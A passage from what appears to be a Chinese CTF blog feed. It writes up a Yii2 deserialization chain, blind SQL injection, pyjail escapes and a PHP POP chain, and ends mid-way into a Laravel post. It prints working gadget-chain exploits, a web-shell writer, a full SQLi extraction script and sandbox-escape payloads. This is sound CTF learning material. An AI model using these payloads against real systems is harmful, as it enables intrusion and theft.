src="https://img-blog.csdnimg.cn/20210710134258823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>看到<code>call_user_func_array</code>就好办了，跟进getFormatter函数，这里<code>$this-&gt;formatters</code>可控，因此<code>getFormatter</code>方法的返回值也是我们可控的，因此<code>call_user_func_array($this-&gt;getFormatter($formatter), $arguments)</code>;中，回调函数是我们可控的，但是<code>$arguments</code>为空，所以相当于我们现在能干两件事，可以调用yii2中任意的一个无参方法，或者调用原生php的类似phpinfo()这样的无参方法，但是第二种肯定不能RCE，因此还要在yii2中已有的无参方法中进行挖掘：</p><p>最后找到的<code>rest/CreateAction.php以及rest/IndexAction.php</code>都很好用。这里分析一下IndexAction.php：<br>主要是它的run方法：</p><p><img src="https://img-blog.csdnimg.cn/20210710134545205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><code>$this-&gt;checkAccess</code>和<code>$this-&gt;id</code>都是我们可控的，相当于直接函数名和参数都可控了，反序列化链至此结束。</p><p>题目给的这个题，反序列化入口很容易找到：</p><p><img src="https://img-blog.csdnimg.cn/20210710140803158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>现在整个看下来，这个链还是比较好理解的。</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_dataReader</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>;<br>    &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$formatters</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction(),<span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br>    <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess=<span class="hljs-string">&quot;phpinfo&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>&#123;<br><br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>;<br><br>    <span class="hljs-keyword">echo</span> base64_encode(<br>        serialize(<span class="hljs-keyword">new</span> BatchQueryResult()));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>看到了禁用函数</p><p><img src="https://img-blog.csdnimg.cn/20210710205444681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>发现assert没有被禁用</p><p>改一下命令</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;checkAccess=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&quot;file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php eval(\$_GET[&#x27;cmd&#x27;];?&gt;&#x27;)&quot;</span>;<br></code></pre></div></td></tr></table></figure><p>上传蚁剑连接，插件绕过函数禁用即可。第一次没有复现成功，后来又做了一次出了。</p><p>关于yii2一些知识有一张图挺好..</p><p><img src="https://img-blog.csdnimg.cn/20210710220138636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h2><p>进入页面F12可以看到<br><img src="https://img-blog.csdnimg.cn/20210712174230205.png" alt="在这里插入图片描述"></p><p>很明显是注入，进入<code>image.php</code>可以看到图片，试了下不同的id发现好像可以盲注，又简单试了下<br><code>if(ascii(substr(database(),1,1))&gt;1,1,0)</code>发现正常显示，ok直接脚本。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge-09493052703a08b5.sandbox.ctfhub.com:10800/image.php&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_database</span>(<span class="hljs-params">url</span>):</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>low = <span class="hljs-number">32</span><br>high = <span class="hljs-number">128</span><br>mid = (low + high) // <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> low &lt; high:<br>payload = <span class="hljs-string">&quot;if(ascii(substr(database(),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>r = requests.get(url,params = params)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>low = mid + <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br>high = mid<br>mid = (low + high) // <span class="hljs-number">2</span><br><br><span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br><span class="hljs-keyword">break</span><br>name = name + <span class="hljs-built_in">chr</span>(mid)<br><span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_table</span>(<span class="hljs-params">url</span>):</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>low = <span class="hljs-number">32</span><br>high = <span class="hljs-number">128</span><br>mid = (low + high) // <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> low &lt; high:<br>payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/&#x27;ctf&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>r = requests.get(url,params = params)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>low = mid + <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br>high = mid<br>mid = (low + high) // <span class="hljs-number">2</span><br><br><span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br><span class="hljs-keyword">break</span><br>name = name + <span class="hljs-built_in">chr</span>(mid)<br><span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_column</span>(<span class="hljs-params">url</span>):</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>low = <span class="hljs-number">32</span><br>high = <span class="hljs-number">128</span><br>mid = (low + high) // <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> low &lt; high:<br>payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&#x27;users&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>r = requests.get(url,params = params)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>low = mid + <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br>high = mid<br>mid = (low + high) // <span class="hljs-number">2</span><br><br><span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br><span class="hljs-keyword">break</span><br>name = name + <span class="hljs-built_in">chr</span>(mid)<br><span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">result</span>(<span class="hljs-params">url</span>):</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>low = <span class="hljs-number">32</span><br>high = <span class="hljs-number">128</span><br>mid = (low + high) // <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> low &lt; high:<br>payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(username,password)/**/from/**/ctf.users),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>r = requests.get(url,params = params)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>low = mid + <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br>high = mid<br>mid = (low + high) // <span class="hljs-number">2</span><br><br><span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br><span class="hljs-keyword">break</span><br>name = name + <span class="hljs-built_in">chr</span>(mid)<br><span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-comment"># inject_database(url)</span><br><span class="hljs-comment"># inject_table(url)</span><br><span class="hljs-comment"># inject_column(url)</span><br>result(url)<br><span class="hljs-comment"># database  : ctf</span><br><span class="hljs-comment"># table     : users</span><br><span class="hljs-comment"># column    : USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210712174553772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>登录后是一个主机测试，试了试<code>file:///etc/passwd</code>，返回了文件内容直接<code>file:///flag</code>出。<br>这个题感觉比较基础。也没有什么过滤，payload中就过滤了空格。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TSCTF一些总结</title>
    <link href="/2021/07/06/2021-7-6-%E5%85%B3%E4%BA%8Eunicode%E5%AD%97%E7%AC%A6%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/07/06/2021-7-6-%E5%85%B3%E4%BA%8Eunicode%E5%AD%97%E7%AC%A6%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="TSCTF一些总结"><a href="#TSCTF一些总结" class="headerlink" title="TSCTF一些总结"></a>TSCTF一些总结</h2><h4 id="baby-python"><a href="#baby-python" class="headerlink" title="baby_python"></a>baby_python</h4><p>python3中支持 Non-ASCII Identifies，一些其他的unicode字符在执行的时候也 可以被解析成正常字符，比如全角字母，ａｂｃｄｅ……，这样可以绕过大小写字母的检查同时执行代码。</p><p>找到几个相关的题目，先看代码，py2的沙盒逃逸</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br>banned = [<br>    <span class="hljs-string">&quot;import&quot;</span>,<br>    <span class="hljs-string">&quot;exec&quot;</span>,<br>    <span class="hljs-string">&quot;eval&quot;</span>,<br>    <span class="hljs-string">&quot;pickle&quot;</span>,<br>    <span class="hljs-string">&quot;os&quot;</span>,<br>    <span class="hljs-string">&quot;subprocess&quot;</span>,<br>    <span class="hljs-string">&quot;kevin sucks&quot;</span>,<br>    <span class="hljs-string">&quot;input&quot;</span>,<br>    <span class="hljs-string">&quot;banned&quot;</span>,<br>    <span class="hljs-string">&quot;cry sum more&quot;</span>,<br>    <span class="hljs-string">&quot;sys&quot;</span><br>]<br>targets = __builtins__.__dict__.keys()<br>targets.remove(<span class="hljs-string">&#x27;raw_input&#x27;</span>)<br>targets.remove(<span class="hljs-string">&#x27;print&#x27;</span>)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> targets:<br>    <span class="hljs-keyword">del</span> __builtins__.__dict__[x]<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)<br>    data = raw_input()<br>    <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> banned:<br>        <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> data.lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No bueno&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>   <span class="hljs-keyword">else</span>: <span class="hljs-comment"># this means nobreak</span><br>        <span class="hljs-built_in">exec</span> data<br></code></pre></div></td></tr></table></figure><p>这个题ban掉了一些函数，并且删除掉了bultins里面的函数，那我们就直接换一个常见的链即可 ,然后对于os 和system用简单的字符串拼接就可以。</p><p>构造payload即可</p><p><code>print(().__class__.__base__.__subclasses__()[60].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;))</code></p><p><img src="https://img-blog.csdnimg.cn/20210707135456889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>第二道题</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to my pyjail! pls dont escape&quot;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>  inp = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>  <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span>:<br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> inp:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;no u&quot;</span>)<br>      exit()<br>  <span class="hljs-built_in">exec</span>(inp)<br></code></pre></div></td></tr></table></figure><p>看到exec，应该就是绕过限制任意代码执行了。可以看到它过滤了所有的大小写英文字母。这道题看了wp才会。</p><p>尝试将<code>__import__(&#39;os&#39;).system(&#39;ls&#39;)</code>转换为八进制</p><p><code>137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51</code></p><p>在本地环境上可以执行成功，但是在题目上就执行不了</p><p><img src="https://img-blog.csdnimg.cn/20210707142044387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210707142058270.png" alt="在这里插入图片描述"></p><p>然后可以利用python中对于Unicode字符的支持来做</p><p><img src="https://img-blog.csdnimg.cn/2021070714243484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>所有都会被转换成 unicode 的NFKC 也就是标准模式</p><p><img src="https://img-blog.csdnimg.cn/20210707142407751.png" alt="在这里插入图片描述"></p><p>将<code>__import__(&quot;os&quot;).system(&quot;dir&quot;)</code>字符转成unicode，命令转为八进制</p><p><code>__𝑖𝑚𝑝𝑜𝑟𝑡__(&quot;\157\163&quot;).𝒔𝒚𝒔𝒕𝒆𝒎(&quot;\144\151\162&quot;)</code>，即可执行成功</p><p><img src="https://img-blog.csdnimg.cn/20210707183159225.png" alt="在这里插入图片描述"></p><p>cmder编码没弄，没显示出来。。</p><h3 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy_unserialize"></a>easy_unserialize</h3><p>分析</p><blockquote><p>这个题目主要涉及到的点都是比较基础，翻看一下反序列化的知识点都应该能做出来: 观察代码，发现只有class C有__destruct函数，所以入口点反序列化的起点就是在这个类，其中 $this- &gt;server-&gt;event[“test”] 这段代码是可控的，所以构造class A赋值给$this-&gt;server ，注意这里的class B是第一个坑，这个类并没啥用 进入到class A，调用 toRead ，需要构造一下event[“test”] 这个参数，php反序列化的时候没有对应的 参数，可以伪造一个，只限定非private属性的 进入到toRead函数 ，这是第二个坑，部分同学希望直接调用readfile函数读取flag，但是并不可行，应为最 后调用的fread函数是个资源类型的函数，并不能成功读取任何东西 真实的触发点在file_exists($this-&gt;file) ，这个函数除了可以触发phar协议的反序列化之外还可以触 发__toString函数，只有class D有__toString函数，所以此时就让class D赋值给$this-&gt;file 进入到class D之后明显有个__call 可以触发函数调用，继续跟进数据流，在doDisplay函数中有一个show 函数是没出现过的，所以，这里是触发__call函数的关键，所以让其调用自己本身，再去触发__call 然后到了最后一个利用点，此时发现构造函数的第二个参数是不可控的，PHP里可以用到一个函数，assert ，利用assert执行代码</p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-comment">// private $length;</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$isRead</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$event</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-keyword">new</span> D();<br><span class="hljs-keyword">$this</span>-&gt;isRead = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">$this</span>-&gt;event = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;test&quot;</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-keyword">$this</span>, <span class="hljs-string">&quot;toRead&quot;</span>));<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$server</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;server = <span class="hljs-keyword">new</span> A();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$param</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$curtain</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;param = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;show&quot;</span>=&gt;<span class="hljs-string">&quot;assert&quot;</span>);<br><span class="hljs-keyword">$this</span>-&gt;curtain = <span class="hljs-keyword">$this</span>;<br><span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&#x27;eval(@$_POST[\&#x27;a\&#x27;])&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize(<span class="hljs-keyword">new</span> C())));<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>laravel详细学习</title>
    <link href="/2021/07/04/2020-7-4-laravel%E8%AF%A6%E7%BB%86%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/07/04/2020-7-4-laravel%E8%AF%A6%E7%BB%86%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="laravel详细学习"><a href="#laravel详细学习" class="headerlink" title="laravel详细学习"></a>laravel详细学习</h2><p>[TOC]</p><h4 id="apache配置"><a href="#apache配置" class="headerlink" title="apache配置"></a>apache配置</h4><figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl"><span class="hljs-comment"># Virtual Hosts</span><br><br><span class="hljs-comment">#</span><br>&lt;VirtualHost *:<span class="hljs-number">80</span>&gt;<br>  ServerName localhost <span class="hljs-comment">#这句是自己随意取的域名</span><br>  ServerAlias localhost<span class="hljs-comment">#服务器别名</span><br>  DocumentRoot <span class="hljs-string">&quot;<span class="hljs-subst">$&#123;INSTALL_DIR&#125;</span>/www&quot;</span><span 